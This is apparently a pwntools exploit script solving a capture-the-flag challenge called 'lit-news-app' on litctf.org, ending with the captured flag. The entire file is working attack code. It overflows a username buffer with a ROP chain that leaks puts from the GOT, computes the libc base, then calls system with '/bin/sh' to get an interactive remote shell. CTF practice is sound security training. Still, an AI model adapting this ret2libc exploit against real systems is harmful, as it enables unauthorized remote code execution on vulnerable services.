from pwn import *

p = remote("litctf.org", 31779)
file = ELF("/path/to/working/directory/lit-news-app")

# ROPgadget --binary ./lit-news-app --only "pop|ret"
addr_pop_rdi = 0x401323  # 0x0000000000401323 : pop rdi ; ret
addr_ret = 0x40101A  # 0x000000000040101A : ret

addr_main = file.sym["main"]  # 0x00000000004011E6

print(p.recvuntil(b"Enter username:\n"))
p.sendline(
    b"LITCTF\x00"
    + b"A" * 33
    + p64(addr_pop_rdi)
    + p64(file.got["puts"])
    + p64(file.plt["puts"])
    + p64(file.sym["main"])
)
print(p.recvuntil(b"Enter password:\n"))
p.sendline(b"d0nt_57r1ngs_m3_3b775884")

print(p.recvuntil(b"Goodbye\n"))
resp = p.recvline().strip()
leaked_puts = u64(resp.ljust(8, b"\x00"))
print("leaked_puts:", resp, hex(leaked_puts))

offset_puts = 0x087BE0
offset_system = 0x058750
offset_bin_sh = 0x1CB42F

libc_base = leaked_puts - offset_puts
addr_system = libc_base + offset_system
addr_bin_sh = libc_base + offset_bin_sh

print(p.recvuntil(b"Enter username:\n"))
p.sendline(
    b"LITCTF\x00"
    + b"A" * 33
    + p64(addr_pop_rdi)
    + p64(addr_bin_sh)
    + p64(addr_ret)  # stack alignement
    + p64(addr_system)
    # + p64(some_return_address)  # no need to return again
)
print(p.recvuntil(b"Enter password:\n"))
p.sendline(b"d0nt_57r1ngs_m3_3b775884")
print(p.recv())
p.interactive()

# LITCTF{s3cret_LIT_n3w5:_4ll_r3v_1s_pwn???}
